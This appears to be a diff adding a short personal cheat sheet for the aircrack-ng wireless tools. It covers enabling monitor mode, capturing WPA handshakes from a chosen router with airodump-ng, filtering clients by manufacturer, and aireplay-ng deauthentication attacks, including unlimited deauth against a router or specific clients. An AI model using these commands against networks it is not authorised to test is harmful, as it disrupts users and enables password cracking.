@@ -1,0 +1,18 @@
+tsu #root
+iwconfig #list of adapters
+airmon-ng [start\stop] [name of adapter] #turn on monitor mode or off
+airodump-ng [name of the adapter] #start scanning with the adapter
+	-c #channel
+	--bssid #mac of the router
+	-w #file for the saving ( for the handshakes, analytics )
+		airodump-ng -c [channel] --bssid [bssid] -w handshake wlan0
+	--band [bg/a/ab] #scan by the ghz, bg 2.4 ghz, a 5 ghz, ab 2,4 and 5 ghz
+	--manufacturer [Apple, TP-Link] #scan by first 00:00:00 of the mac
+		#if you dont want manufactur the router, only clients that connected to the router:
+			airodump-ng --bssid [bssid of the router] --manufacturer [Apple] [your wifi adapter]
+		
+aireplay-ng #different attack to the routers
+	--deauth [amount of packets] # 0 - infinity
+	-a [mac of the wifi]
+	-c [mac of the client] #only if you want to deauth attack only 1 person or more
+	
